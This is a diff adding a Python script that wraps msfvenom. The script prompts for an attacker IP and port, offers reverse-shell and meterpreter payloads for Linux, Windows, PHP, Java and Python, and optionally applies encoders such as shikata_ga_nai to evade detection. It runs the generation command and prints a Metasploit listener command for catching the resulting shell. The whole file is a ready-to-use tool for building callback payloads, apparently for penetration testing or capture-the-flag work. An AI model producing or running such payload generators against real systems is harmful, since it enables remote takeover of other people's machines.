@@ -1,0 +1,155 @@
+#! /usr/bin/env python3
+
+
+import os
+import sys
+
+# Function to display payload options
+def display_payload_options():
+    # Updated list of payloads based on your requirements
+    payloads = [
+        " linux/x64/shell_reverse_tcp",
+        " linux/x86/shell_reverse_tcp",
+        " linux/x64/meterpreter/reverse_tcp",
+        " linux/x86/meterpreter/reverse_tcp",
+        " linux/x64/shell/reverse_tcp"  ,
+        " linux/x86/shell/reverse_tcp",
+        " windows/x64/shell_reverse_tcp",
+        " windows/shell_reverse_tcp",
+        " windows/x64/meterpreter/reverse_tcp",
+        "windows/meterpreter/reverse_tcp",
+        "windows/x64/shell/reverse_tcp",
+        "windows/shell/reverse_tcp",
+        "php/meterpreter/reverse_tcp", 
+        "java/jsp_shell_reverse_tcp",
+        "cmd/unix/reverse_python"
+    ]
+    print("\033[93mSelect a payload:\033[0m")
+    for i, payload in enumerate(payloads):
+        print(f"\033[92m{i+1}. {payload}\033[0m")
+
+    while True: 
+        try:
+            choice = int(input("\033[93mEnter the number of your choice:\033[0m "))      
+         #   choice = int(input("Enter the number of your choice: "))       
+            if 1 <= choice <= len(payloads):
+                return payloads[choice - 1]
+            else:
+                print("Invalid choice. Try again.")
+        except ValueError:
+            print("Please enter a valid number. Try again.")
+    
+    return payloads[choice - 1]
+
+# Function to display file format options
+def display_format_options(payload):
+    formats = {
+        "linux": ["elf", "sh"],
+        "windows": ["exe", "dll"],
+        "php": ["php"],
+        "java": ["war", "jar"],
+        "cmd": ["py"]
+    }
+     
+    # Determine the type of payload
+    payload_type = ""
+    if "linux" in payload:
+        payload_type = "linux"
+    elif "windows" in payload:
+        payload_type = "windows"
+    elif "php" in payload:
+        payload_type = "php"
+    elif "java" in payload:
+        payload_type = "java"
+    elif "cmd" in payload:
+        payload_type = "cmd"
+   
+
+    available_formats = formats.get(payload_type, [])
+    if all(x in payload for x in ["meterpreter", "linux"]):
+        available_formats = ['elf']
+ 
+    print(available_formats)
+    if len(available_formats) == 1:
+        print(f"\033[93mOnly one file format available: {available_formats[0]}\033[0m")
+        #print(f"Only one file format available: {available_formats[0]}")
+        return available_formats[0]
+    else:
+        print("\033[93mSelect a file format:\033[0m")
+        #print("Select a file format:")
+        for i, format in enumerate(available_formats):
+           print(f"\033[92m{i+1}. {format}\033[0m")
+         # print(f"{i+1}. {format}")
+        
+
+    while True: 
+        try:
+            choice = int(input("\033[93mEnter the number of your choice:\033[0m "))      
+
+#            choice = int(input("Enter the number of your choice: "))     
+            if 1 <= choice <= len(available_formats):
+                    return available_formats[choice - 1]
+            else:
+                    print("Invalid choice. Try again.")
+        except ValueError:
+            print("Please enter a valid number. Try again.")   
+            
+    return formats[payload_type][choice - 1]
+# Collect user input
+    print("\033[93mSelect a payload:\033[0m")
+try:
+    ip = input("\033[93mIP attacker? [default:  tun0] \033[0m   ")
+    port = input("\033[93mPORT attacker [default: 9000]?\033[0m   ")
+    file = input("\033[93mNAME OF FILE? [default:  shell]\033[0m   ")
+except KeyboardInterrupt:
+    print(f"\n\nexiting...\n\n")
+    sys.exit(0)
+if not ip:
+    ip="tun0"
+if not port:
+    port="9000"
+if not file:
+    file="shell"
+# Display payload and format options and get user choice
+try:
+    print("PAYLOAD OPTIONS:")
+    payload = display_payload_options()
+
+    print("FILE FORMAT OPTIONS:")
+    formatFile = display_format_options(payload)
+except KeyboardInterrupt:
+    print(f"\n\nexiting...\n\n")
+    sys.exit(0)
+
+encoded=""
+if len(sys.argv) > 1:
+    if sys.argv[1]=="-c":
+        if "64" in payload:
+            encoded="--encoder x64/zutto_dekiru"      
+        else:
+            encoded= "--encoder x86/shikata_ga_nai"
+
+
+if formatFile == "php":
+        command = f"msfvenom -p {payload} -o ~/{file}.{formatFile}   LHOST={ip} LPORT={port} {encoded}"
+elif formatFile == "elf":
+    command = f"msfvenom -p {payload} -f {formatFile} -o ~/{file}  LHOST={ip} LPORT={port} {encoded}"
+else:
+    command = f"msfvenom -p {payload} -f {formatFile} -o ~/{file}.{formatFile}   LHOST={ip} LPORT={port} {encoded}"
+
+
+print("Generated command:")
+print(command)
+print("Executing...")
+
+try:
+    # Execute the command
+    os.system(command)
+except:
+    print(f"\n\nexiting...\n\n")
+    sys.exit(0)
+
+# Print the listener command
+listener_command = f'sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {ip}; set LPORT {port}; exploit"'
+print("\nTo set up the listener, run the following command:")
+print(f"\033[1;31m{listener_command}\033[0m")  # 1 is for bold, 31 is for red, and 0m resets it
